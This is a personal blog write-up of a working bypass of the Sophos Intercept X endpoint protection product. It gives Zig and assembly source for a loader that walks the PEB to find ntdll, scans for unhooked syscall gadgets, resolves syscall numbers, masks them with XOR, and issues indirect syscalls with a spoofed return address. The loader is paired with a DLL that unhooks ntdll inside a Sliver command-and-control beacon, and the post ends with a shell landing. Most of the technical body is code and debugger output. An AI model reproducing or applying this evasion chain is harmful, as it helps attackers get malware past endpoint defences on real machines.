# https://yenn503.github.io/posts/sophos-intercept-x-bypass/

![Bypassing Sophos Intercept X](https://yenn503.github.io/images/NunsEDR.png)Table of Contents

- [Why Zig](https://yenn503.github.io/posts/sophos-intercept-x-bypass/#why-zig)
- [From Win32 down to the kernel](https://yenn503.github.io/posts/sophos-intercept-x-bypass/#from-win32-down-to-the-kernel)
- [The syscall stub and how EDRs hook it](https://yenn503.github.io/posts/sophos-intercept-x-bypass/#the-syscall-stub-and-how-edrs-hook-it)
- [Finding ntdll without calling an API](https://yenn503.github.io/posts/sophos-intercept-x-bypass/#finding-ntdll-without-calling-an-api)
- [The gadget pool](https://yenn503.github.io/posts/sophos-intercept-x-bypass/#the-gadget-pool)
- [Getting the syscall numbers](https://yenn503.github.io/posts/sophos-intercept-x-bypass/#getting-the-syscall-numbers)
- [hells\_gate and hell\_descent](https://yenn503.github.io/posts/sophos-intercept-x-bypass/#hells_gate-and-hell_descent)
- [Result](https://yenn503.github.io/posts/sophos-intercept-x-bypass/#result)
- [Personal note](https://yenn503.github.io/posts/sophos-intercept-x-bypass/#personal-note)

## Why Zig [\#](https://yenn503.github.io/posts/sophos-intercept-x-bypass/\#why-zig)

I got bored again. So I started learning Zig syntax and how it could be beneficial
when it comes to writing loaders. I just wanted something new to try, and with Zig
being early days still I thought why not. There aren’t many variations out there
currently, so in terms of signatures and pattern detection Zig plays a role here
although the underlying behaviour is the same.

If you’re new to Windows internals there are some amazing resources and tools out there to help, such as SysWhispers which handles all the syscalls and structs for you. But I was taught to use [MSDN](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess) for the Win32 functions and [NtDoc](https://ntdoc.m417z.com/ntopenprocess) for the undocumented counterpart. I mention this because it forces you to understand how the structs work and the pointers to such. Both are a goldmine of info :). Also definitely head over to [Crr0ww](https://www.youtube.com/@crr0ww), I can’t recommend his videos enough for explaining these topics. Even better, the homies at [Church of Malware](https://churchofmalware.org/#about) are always helpful with anything, I can’t praise them enough, truly inspiring.

## From Win32 down to the kernel [\#](https://yenn503.github.io/posts/sophos-intercept-x-bypass/\#from-win32-down-to-the-kernel)

Most applications use the Win32 API directly: [OpenProcess](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess). That invokes
[GetProcAddress](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress) leading into `kernelbase.dll`, then into the undocumented sections of
Windows: the Native API. Here the function becomes `NtOpenProcess`. Most native
versions are nearly identical to their Win32 counterparts, just one layer deeper.
It’s here we get the `syscall` instruction, which takes us into the kernel.

## The syscall stub and how EDRs hook it [\#](https://yenn503.github.io/posts/sophos-intercept-x-bypass/\#the-syscall-stub-and-how-edrs-hook-it)

Every `Nt*` function in `ntdll.dll` is a tiny stub. It puts a number in `EAX` and fires
the `syscall` instruction.

```text
4C 8B D1          mov r10, rcx        ; arg1 into R10 (kernel convention)
B8 18 00 00 00    mov eax, 0x18       ; syscall number 24
0F 05             syscall              ; enter kernel
C3                ret
```

copy

The kernel wants the first argument in `R10` not `RCX`. The syscall number goes in
`EAX`. That `B8` byte is the opcode for `mov eax, imm32` so the four bytes after it
are the actual syscall number.

Sophos overwrote those first bytes with a `jmp` into its own DLL
(`hmpalert.dll`). Now every call to that function jumps into Sophos’s DLL.

```text
Clean:   4C 8B D1 B8 18 00 00 00 ...   ← normal stub
Hooked:  E9 63 00 EB BF ...            ← jmp into hmpalert.dll
```

copy

Instead of fighting the EDR to allow IDA or x64dbg I just ran a quick PowerShell one-liner using `GetModuleHandle` for NTDLL and `GetProcAddress` for each function with
an output format of CLEAN and HOOKED:

```text
[HOOKED] NtAllocateVirtualMemory      = E9 63 00 EB BF ... 0F 05 C3
[HOOKED] NtWriteVirtualMemory         = E9 01 05 B5 D3 ... 0F 05 C3
[CLEAN]  NtDelayExecution             = 4C 8B D1 B8 34 00 00 00 ...
[HOOKED] NtClose                      = E9 23 01 EB BF ... 0F 05 C3
[HOOKED] NtProtectVirtualMemory       = E9 83 F7 EA BF ... 0F 05 C3
[CLEAN]  NtCreateThreadEx             = 4C 8B D1 B8 C9 00 00 00 ...
[HOOKED] NtQueueApcThread             = E9 21 03 B5 D3 ... 0F 05 C3
[CLEAN]  NtOpenProcess                = 4C 8B D1 B8 26 00 00 00 ...
```

copy

Five stubs hooked from what I requested. `NtDelayExecution` left clean. Sophos monitors
sleep via kernel callbacks instead of user-mode hooks.

I also noticed they never hooked `NtOpenProcess` and `NtCreateThreadEx`. These are used
in almost every sample, so it threw me off at first. Researching this showed that more
modern mechanisms rely on
[PsSetCreateThreadNotifyRoutine](https://ntdoc.m417z.com/pssetcreatethreadnotifyroutine)
as a kernel alert which we’d only reach via a vulnerable driver (BYOVD), a tradeoff of
its own.

Think about the OPSEC and network segmentation, possibly IDS/IPS. An EDR agent just
going silent is a red flag to any SIEM configured correctly.

AMSI plays a factor too, so relying on LoLBins / trusted commands to stay under the
radar, and BOFs to run inline with the process.

![Sophos hooked stubs. E9 = jmp into hmpalert.dll](https://yenn503.github.io/images/evidence/hooked-stubs.png)

Sophos hooked stubs. E9 = jmp into hmpalert.dll

Idea from here is get the right number into `EAX`, land in a `syscall`
instruction that Sophos hasn’t touched, and don’t leave evidence in memory or on the
stack that says you did it.

## Finding ntdll without calling an API [\#](https://yenn503.github.io/posts/sophos-intercept-x-bypass/\#finding-ntdll-without-calling-an-api)

First to do any of this I need ntdll’s base address in memory. The normal way is
`GetModuleHandle("ntdll.dll")` but like I said before that’s a red flag straight away, it puts the
lookup in the IAT (import address table) and on the call stack where an EDR can see a
process asking about ntdll. Straight RIP.

So we will walk the PEB (Process Environment Block) instead. Every thread has a TEB (Thread Environment Block) and on x64 the `gs`
register points straight at it. I found this just by hovering the `gs` symbol in
x64dbg. The info box even says itself the TEB can be used to grab info without touching the Win32
API. Instead of asking Windows for ntdll you just read it out of a struct Windows keeps
in memory anyway.

The chain is `gs` -\> TEB -> PEB -> `Ldr` -\> list of DLLs -> ntdll base. Kage walks that
list, checks each module name, grabs `DllBase` when it hits `ntdll.dll`. No
`GetModuleHandle`, just process memory. From here everything else (gadgets, SSNs,
dispatch) works off that base.

**Debug walk**![hovering gs in x64dbg, the TEB info box says no Win32 API needed](https://yenn503.github.io/images/evidence/teb-info-hover.png)

hovering gs in x64dbg, the TEB info box says no Win32 API needed

![the PEB walk start in x64dbg, mov rax, gs:[60]](https://yenn503.github.io/images/evidence/peb-walk-start.png)

the PEB walk start in x64dbg, mov rax, gs:\[60\]

`mov rax, gs:[60]` and one step later RAX holds the PEB:

![RAX = PEB from gs:0x60](https://yenn503.github.io/images/evidence/rax-peb-address.png)

RAX = PEB from gs:0x60

Next reads `rax+18`, meaning PEB+0x18 which is `Ldr`:

![mov rax, [rax+18] - PEB+0x18 reads Ldr](https://yenn503.github.io/images/evidence/rax-ldr-disasm.png)

mov rax, \[rax+18\] - PEB+0x18 reads Ldr

`add rax, 20` makes RAX the list head, Ldr+0x20. Every module has a `Flink`, Windows’s
word for pointer to the next module, follow them through every DLL loaded:

![add rax, 20 - RAX becomes the list head (Ldr+0x20)](https://yenn503.github.io/images/evidence/rax-add20-disasm.png)

add rax, 20 - RAX becomes the list head (Ldr+0x20)

![RAX = list head after the add (Ldr+0x20), x64dbg labels it in ntdll’s range](https://yenn503.github.io/images/evidence/rax-add20.png)

RAX = list head after the add (Ldr+0x20), x64dbg labels it in ntdll’s range

The loop loads the first module’s `Flink` and follows it:

![mov rax, [rbp-28] - load the first module’s Flink](https://yenn503.github.io/images/evidence/rax-modulelist-disasm.png)

mov rax, \[rbp-28\] - load the first module’s Flink

![mov rax, [rax] - follow the Flink to the first module](https://yenn503.github.io/images/evidence/rax-flink-disasm.png)

mov rax, \[rax\] - follow the Flink to the first module

![RAX = first module in the list](https://yenn503.github.io/images/evidence/rax-modulelist.png)

RAX = first module in the list

The `cmp` checks if the first module is already back at the list head, which means the
list is empty and it bails. The zero flag answers that, here it’s 0 so the loop runs:

![cmp - is first module == head?](https://yenn503.github.io/images/evidence/rax-cmp-disasm.png)

cmp - is first module == head?

![ZF = 0, first module != head, so the loop runs](https://yenn503.github.io/images/evidence/rax-cmp.png)

ZF = 0, first module != head, so the loop runs

The loop skips any module with a null `dll_base`, then compares the short name
against `ntdll.dll`. Only when that matches does it load `dll_base` and hand it back:

![mov rax, [rax+30] - the return read, then ret hands ntdll base back in RAX](https://yenn503.github.io/images/evidence/ntdll-return-chunk.png)

mov rax, \[rax+30\] - the return read, then ret hands ntdll base back in RAX

RAX holds ntdll’s base:

![RAX = ntdll base in the register panel](https://yenn503.github.io/images/evidence/ntdll-found.png)

RAX = ntdll base in the register panel

Dumping that address starts with `4D 5A`, “MZ”, the DOS header every PE has, so it’s
confirmed ntdll:

![dump of ntdll’s base showing MZ](https://yenn503.github.io/images/evidence/ntdll-mz.png)

dump of ntdll’s base showing MZ

And it prints once the walk returns:

![terminal output: [+] found ntdll : 0x7FFA20160000](https://yenn503.github.io/images/evidence/ntdll-found-terminal.png)

terminal output: \[+\] found ntdll : 0x7FFA20160000

**Code**

```zig
fn findNtdll() ?[*]u8 {
    const peb_addr: usize = asm volatile ("mov %%gs:0x60, %[r]"
        : [r] "=r" (-> usize),
    );
    const peb_ptr = @as(*const PEB, @ptrFromInt(peb_addr));
    const head = &peb_ptr.ldr.in_memory_order_module_list;

    var entry = head.flink;
    while (entry != head) : (entry = entry.flink) {
        const mod: *LDR_DATA_TABLE_ENTRY = @fieldParentPtr("in_memory_order_links", entry);
        if (@intFromPtr(mod.dll_base) == 0) continue;
        const name = mod.base_dll_name.buffer[0 .. mod.base_dll_name.length / 2];
        if (std.mem.eql(u16, name, &[_]u16{ 'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l' })) {
            return @ptrCast(mod.dll_base);
        }
    }
    return null;
}
```

copy

## The gadget pool [\#](https://yenn503.github.io/posts/sophos-intercept-x-bypass/\#the-gadget-pool)

(Clean vs hooked stubs and the `E9` into hmpalert are in [The syscall stub and how EDRs hook it](https://yenn503.github.io/posts/sophos-intercept-x-bypass/#the-syscall-stub-and-how-edrs-hook-it) above.)

Now in this section it works similiar in a way when doing indirect syscalls. Inside of `ntdll` there are plenty of `syscall; ret` instructions (the bytes `0F 05 C3`).
A lot of them sit at the end of an `Nt*` function. So normally when we want to make a syscall we get a handle to `ntdll.dll`, then `GetProcAddress` for the function address and store them inside our own global variables for each one. Then if we was actually doing an indirect syscall we create the full stubs for each function in an asm file, put the `SSN` into `eax`, then jump into ntdll’s `syscall; ret` instead of calling the hooked `Nt*` start. Whereas if you fire `syscall` from your own image instead of going through ntdll, that is what throws an alert to EDRs, legit code goes through the Nt\* API always. Sophos already hooked a load of those starts (see the dump above) so we cant use that entry.

We dont actually need the whole of the stub we only need the final `syscall;ret` (`0F 05 C3`). Then we can store these addresses inside of a variable called `g_syscall_addrs`. Next we just need a lone `C3` (`ret`) which doesnt have the previous two bytes of `0F 05`. We then use this ret as our fake return address, so a stack walk sees ntdll called it and not the loader. Clever right ? i hope i explained it well enough you can see how it is an indirect call again by routing through `ntdll`.

**Debug walk**

Find the `.text` section. It loads the string `".text"` into R9 and compares each
section name until it matches, then reads `VirtualAddress` and `VirtualSize` for the
scan range:

![lea r9 loads the .text string for the section name compare (syscall.zig:182)](https://yenn503.github.io/images/evidence/gadget-text-section.png)

lea r9 loads the .text string for the section name compare (syscall.zig:182)

Counter resets to 0, start index is the `.text` RVA, stop is start plus size (the loop
stops 3 bytes early so a 3-byte gadget never reads past the end):

![g_syscall_count = 0, j = text_va, scan_end = text_va + text_size](https://yenn503.github.io/images/evidence/gadget-scan-range.png)

g\_syscall\_count = 0, j = text\_va, scan\_end = text\_va + text\_size

Then the byte loop. Base pointer in RAX (still ntdll’s base from the PEB walk), scan
index in RCX. First check is whether `base[j]` is `0F`:

![cmp byte ptr [rax+rcx], 0F - first byte of the gadget check](https://yenn503.github.io/images/evidence/gadget-cmp-0f-disasm.png)

cmp byte ptr \[rax+rcx\], 0F - first byte of the gadget check

![RAX still ntdll base (0x7FFA20160000) while the scan runs](https://yenn503.github.io/images/evidence/gadget-scan-ptr.png)

RAX still ntdll base (0x7FFA20160000) while the scan runs

Same idea for `05` then `C3`. All three match and it stores the address in
`g_syscall_addrs` and bumps the count:

![mov [rax+rcx*8], rdx - write gadget address into g_syscall_addrs](https://yenn503.github.io/images/evidence/gadget-store-line.png)

mov \[rax+rcx\*8\], rdx - write gadget address into g\_syscall\_addrs

Dump that stored address and the bytes are right there:

![dump at 0x7FFA202BFBE2 starts with 0F 05 C3](https://yenn503.github.io/images/evidence/gadget-0f05c3-dump.png)

dump at 0x7FFA202BFBE2 starts with 0F 05 C3

![RDX = gadget address 0x7FFA202BFBE2, labelled inside ntdll](https://yenn503.github.io/images/evidence/gadget-0f05c3.png)

RDX = gadget address 0x7FFA202BFBE2, labelled inside ntdll

**Code**

```zig
fn scan_gadget_pool(ntdll_base: ?*anyopaque) ?void {
    const base = ntdll_base orelse return null;
    const base_bytes: [*]const u8 = @ptrCast(base);
    const nt_hdrs = pe.getNtHeaders(base_bytes) orelse return null;

    const section_off = @intFromPtr(nt_hdrs) - @intFromPtr(base_bytes) + @sizeOf(pe.IMAGE_NT_HEADERS64);
    const sections = @as([*]align(1) const pe.IMAGE_SECTION_HEADER, @ptrCast(@alignCast(
        @as([*]u8, @ptrCast(@constCast(base_bytes))) + section_off,
    )));

    var text_va: usize = 0;
    var text_size: usize = 0;
    for (0..nt_hdrs.FileHeader.NumberOfSections) |si| {
        const sec = &sections[si];
        if (std.mem.eql(u8, sec.Name[0..5], ".text") and sec.Name[5] == 0) {
            text_va = sec.VirtualAddress;
            text_size = sec.VirtualSize;
            break;
        }
    }
    if (text_va == 0 or text_size == 0) return null;

    g_syscall_count = 0;
    var j: usize = text_va;
    const scan_end: usize = text_va + text_size;
    while (j < scan_end - 3 and g_syscall_count < g_syscall_addrs.len) : (j += 1) {
        if (base_bytes[j] == 0x0F and base_bytes[j + 1] == 0x05 and base_bytes[j + 2] == 0xC3) {
            g_syscall_addrs[g_syscall_count] = @intFromPtr(&base_bytes[j]);
            g_syscall_count += 1;
        }
        if (g_fake_return_addr == 0 and base_bytes[j] == 0xC3) {
            if (j < 2 or base_bytes[j - 2] != 0x0F or base_bytes[j - 1] != 0x05) {
                g_fake_return_addr = @intFromPtr(&base_bytes[j]);
            }
        }
    }
    if (g_syscall_count == 0) return null;
}
```

copy

That gives me the pool of clean `syscall; ret` addresses. But I still need the right
number in `EAX` for each call. That is next.

## Getting the syscall numbers [\#](https://yenn503.github.io/posts/sophos-intercept-x-bypass/\#getting-the-syscall-numbers)

Back to the clean stub in [The syscall stub and how EDRs hook it](https://yenn503.github.io/posts/sophos-intercept-x-bypass/#the-syscall-stub-and-how-edrs-hook-it).
The bit that matters for the number is still `mov eax, SSN` (`B8` then four bytes). Get
it wrong and nothing works. And because a lot of those stubs are hooked (same dump as
above) you cant always just read the `B8` off the front. So Kage does it two ways.

First it walks ntdll’s export table, keeps the `Nt*` names, sorts them by RVA (where
they sit in memory). Windows basically laid the syscalls out in order so the index in
that sorted list is a candidate number. This never reads the stub bytes so hooks dont
matter. One catch though. I only sort `Nt*` not the full export table. If you sort
everything by RVA you get non-Nt exports mixed in (`Rtl*`, `Ldr*`, etc) which
shift the index. I skip those so the index starts from the first `Nt*` function,
not from the first export. The difference is a fixed offset on each build.

Say memory order goes `RtlThing -> RtlOther -> NtDelayExec -> NtAlloc -> NtProtect`.
Sorting all exports gives NtDelayExec index 2, NtAlloc index 3.
Sorting only Nt\* gives NtDelayExec index 0, NtAlloc index 1.
Offset of 2. On this box the offset was 4.

The byte-scan from a clean stub gives the real SSN for one function.
Subtract the Nt\*-only index from that real SSN, that is the offset.
Apply it to every hooked function.

Second, for the functions I actually need (`NtAllocateVirtualMemory`,
`NtProtectVirtualMemory`, `NtDelayExecution`) it tries to read the real number from the
stub anyway. Uses `.pdata` to get the function range, scans for `0xB8`, takes the four
bytes after it if they look like a sane SSN. If the stub is still clean that is ground
truth.

If it got a real number from a clean stub, it works out
delta = real minus sorted index. On this box that was a flat +4. For any function where
the stub is hooked and there is no `B8` left, sorted index + delta still lands on the
right number.

Prefer the bytes when they are clean, fall back to sorted index + delta when they are
not. Store the finals as plain `u32`s. XOR hide comes in the next section.

For alloc it resolved to 24 decimal which is `0x18` hex. Same number as the clean stub
example right at the start.

![terminal, NtAllocateVirtualMemory ssn=24](https://yenn503.github.io/images/evidence/SSN24resolved.png)

terminal, NtAllocateVirtualMemory ssn=24

![0x18 hex = 24 decimal](https://yenn503.github.io/images/evidence/0x18calc24.png)

0x18 hex = 24 decimal

**Code**

```zig
inline for (names) |name| {
    const fssn = extract_ssn(hash_ror13(name)) orelse return null;
    const byte_ssn = read_ssn_from_stub(@ptrCast(ntdll), name);
    if (byte_ssn) |b| {
        if (!delta_done) {
            delta = @as(i16, @intCast(b)) - @as(i16, @intCast(fssn));
            delta_done = true;
        }
        @field(result, name) = Entry{ .number = b };
    } else {
        @field(result, name) = Entry{ .number = @intCast(@as(i16, @intCast(fssn)) + delta) };
    }
}
```

copy

## hells\_gate and hell\_descent [\#](https://yenn503.github.io/posts/sophos-intercept-x-bypass/\#hells_gate-and-hell_descent)

Now everything comes together. Numbers from the last section, gadget pool and fake ret
from [The gadget pool](https://yenn503.github.io/posts/sophos-intercept-x-bypass/#the-gadget-pool).

When main wants to allocate it does not call `NtAllocateVirtualMemory`. It calls
`syscall_dispatch` with the SSN we just resolved, the args, and the arg count.

`syscall_dispatch` picks a random gadget from the pool, decides if it can use the fake
ret (only when there are under 5 args so nothing important is sitting on the stack),
then hands the real SSN, the gadget address, and the fake ret into `hells_gate`.
`hells_gate` just XORs all three with `0xDEADBEEF` and parks them in data globals so a
quick memory scan does not see plaintext SSNs hanging around. Then `hell_descent` runs
with the actual args.

`hell_descent` is the go bit. Arg1 goes into `R10` (same kernel convention as the clean
stub earlier), masked SSN gets XORed back into `EAX` (for alloc that is `0x18` / 24),
masked gadget gets loaded into R11 then XORed back to the real address, maybe push the fake ntdll ret, then `jmp r11`. That jump
leaves our code and lands on a `syscall; ret` from the pool.

Now RIP is inside ntdll. The `syscall` fires with our number in `EAX`. Kernel does the
work. Never touched the hooked `E9` entry. That was the plan from the start.

**Debug walk**

About to unmask. `EAX` still holds `0xDEADBEF7` which is `0x18` xor `0xDEADBEEF`. Next
line is the `xor eax` that strips it:

![hell_descent on the xor, EAX still 0xDEADBEF7](https://yenn503.github.io/images/evidence/HellsDescentAboutToUnmaskXoredSSN.png)

hell\_descent on the xor, EAX still 0xDEADBEF7

![EAX = 0xDEADBEF7 before unmask](https://yenn503.github.io/images/evidence/maskedSSN.png)

EAX = 0xDEADBEF7 before unmask

After the xor `EAX` is `0x18`. Then it unmasks the gadget into `R11` and hits `jmp r11`:

![EAX = 0x18 after unmask, about to jmp r11](https://yenn503.github.io/images/evidence/unmaskedSSN.png)

EAX = 0x18 after unmask, about to jmp r11

Landed. RIP is on `syscall` inside ntdll, `EAX` still `0x18`. Call stack shows
`syscall_dispatch` then `hell_descent`, but the instruction itself is ntdll’s not a
hooked stub start:

![RIP on syscall inside ntdll, EAX=0x18, stack shows dispatch then hell_descent](https://yenn503.github.io/images/evidence/finalSyscallExecutionFromInsideNtdllItselfNotHookedStub.png)

RIP on syscall inside ntdll, EAX=0x18, stack shows dispatch then hell\_descent

**Code**

```zig
pub fn syscall_dispatch(ssn: u32, args: [*]const usize, arg_count: usize) usize {
    const idx = @as(usize, @truncate(xorshift64())) % g_syscall_count;
    const gadget = g_syscall_addrs[idx];
    const fake: usize = if (arg_count < 5) g_fake_return_addr else 0;
    hells_gate(ssn, gadget, fake);
    // ... pack args ...
    return hell_descent(/* args */);
}
```

copy

```asm
.intel_syntax noprefix

.data
  wSystemCallEnc:       .long 0        ; masked SSN lives here
  qSyscallInsAddressEnc: .quad 0       ; masked gadget address lives here
  qFakeReturnEnc:       .quad 0        ; masked fake return lives here
  wMask:                .long 0xDEADBEEF           ; 32-bit xor mask
  qMask:                .quad 0xDEADBEEFDEADBEEF   ; 64-bit xor mask

.text
.global hells_gate
.global hell_descent

; hells_gate(ssn in ecx, gadget in rdx, fake_ret in r8)
hells_gate:
  xor ecx, dword ptr [rip + wMask]                  ; xor ssn with mask
  mov dword ptr [rip + wSystemCallEnc], ecx          ; store masked ssn
  xor rdx, qword ptr [rip + qMask]                  ; xor gadget with 64-bit mask
  mov qword ptr [rip + qSyscallInsAddressEnc], rdx   ; store masked gadget
  mov rax, r8                                        ; fake_ret into rax
  xor rax, qword ptr [rip + qMask]                  ; xor it with mask
  mov qword ptr [rip + qFakeReturnEnc], rax          ; store masked fake_ret
  ret

; hell_descent(a1-a11 as fastcall args, syscall)
hell_descent:
  mov r10, rcx                                       ; arg1 into r10 (kernel convention)
  mov eax, dword ptr [rip + wSystemCallEnc]          ; load masked ssn
  xor eax, dword ptr [rip + wMask]                   ; unmask -> real ssn in eax
  mov r11, qword ptr [rip + qSyscallInsAddressEnc]   ; load masked gadget
  xor r11, qword ptr [rip + qMask]                   ; unmask -> real gadget addr in r11
  mov rcx, r9                                        ; save arg4 (r9) in rcx
  mov r9, qword ptr [rip + qFakeReturnEnc]           ; load masked fake_ret
  xor r9, qword ptr [rip + qMask]                    ; unmask
  test r9, r9
  jz  .Ldone                                         ; skip push if fake_ret == 0
  push r9                                            ; push fake ntdll ret onto stack
.Ldone:
  mov r9, rcx                                        ; restore arg4 into r9
  mov rcx, r10                                       ; restore arg1 into rcx
  jmp r11                                            ; -> random syscall;ret in ntdll
```

copy

## Result [\#](https://yenn503.github.io/posts/sophos-intercept-x-bypass/\#result)

PEB walk, gadget pool, resolve the numbers, hide them, jump into ntdll and
fire. No hooked Nt\* entry.

Kage handles the syscall layer. [Valak](https://git.churchofmalware.org/JYenn/valak)
handles the beacon side. It’s an evasion DLL that reflectively loads inside the
Sliver beacon. At init it restores ntdll from the clean \\KnownDlls copy,
overwriting Sophos’s user-mode hooks. Every stub in the beacon’s own process is
clean again. No hook, no bypass needed for the beacon’s own API calls after that.

Valak is seperate because it solves slivers beacon calls. Two seperate stages they are dynamic.

Pair both and Sophos Intercept X does not stop it initially. Command execution on the box:

![Sophos Intercept X, Kage + Valak chain running](https://yenn503.github.io/images/evidence/Sophos.png)

Sophos Intercept X, Kage + Valak chain running

![whoami after the chain landed](https://yenn503.github.io/images/evidence/whoami.png)

whoami after the chain landed

Nothing called an API Sophos could hook, shell landed.

## Personal note [\#](https://yenn503.github.io/posts/sophos-intercept-x-bypass/\#personal-note)

If you made it to the end here and enjoyed it, I appreciate you so much for taking the time. If you’re like me and love the offensive and defensive sides of all this, sometimes I ask myself why I go out of my way to do this. But it very much appears that ignorance is still the biggest indicator of compromise today. These systems are only as safe as those controlling them, and that’s you and me. This post should highlight, more than anything, the importance of not relying on a single layer and becoming more proactive rather than reactive. If you have a solid internal and external security posture, the chances of this happening are slim to begin with and, even if it does, it is very much mitigable. I would love to continue and talk much more about how to become more confident in your security and the ways to make life easier when approaching it all. Therefore, this page is going to be a full knowledge and resource dump. None of these technical tools are ever really needed to begin with.

— JYenn

 [Go to Top (Alt + G)](https://yenn503.github.io/posts/sophos-intercept-x-bypass/#top "Go to Top (Alt + G)")